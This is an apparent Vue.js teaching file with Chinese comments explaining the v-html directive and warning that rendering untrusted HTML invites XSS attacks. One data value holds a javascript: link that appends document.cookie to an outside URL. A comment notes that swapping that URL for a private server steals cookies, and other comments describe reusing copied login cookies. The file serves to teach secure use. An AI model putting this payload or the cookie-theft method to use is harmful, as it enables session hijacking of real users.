<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <title></title>
        <script type="text/javascript" src="../vue.js"></script>
    </head>
    <body>
        <!-- v-html指令：
            1,作用：向指定节点中渲染包含htm1结构的内容.
            2,与插值语法的区别
                (1)v-html会替换掉节点中所有的内容，{xx)}则不会。
                (2)v-html可以识别html结构.
            3,严重注意：v-htm1有安全性问题！！！！
                (1)在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
                (2)一定要在可信的内容上使用v-html,永不要用在用户提交的内容上！ -->

        <!-- 
        -->
        <div id="root">
            <div>你好，{{name}}</div>
            <div v-html="str"></div>
            <div v-html="str2"></div>
        </div>
        <script type="text/javascript">
            Vue.config.productionTip = false;//关闭浏览器控制台的vue生产提示
            const vm = new Vue({
                el: '#root',
                data: {
                    name:'尚硅谷',
                    str:'<h3>你好啊！</h3>',
                    //安全问题，使用chrome浏览器开发者工具application获取某个网站的登录cookie，复制到火狐浏览器也可以使用 
                    //除非在application给每一条cookie加上only
                    //可以使用chrome浏览器开发者工具application，手动给http://127.0.0.1:5500/加cookie
                    //将http://www.baidu.com替换为私人服务器，就可以盗取cookie
                    str2:'<a href = javascript : location.href = "http://www.baidu.com" + document.cookie></a>'
                },
            })
        </script>
    </body>
</html>
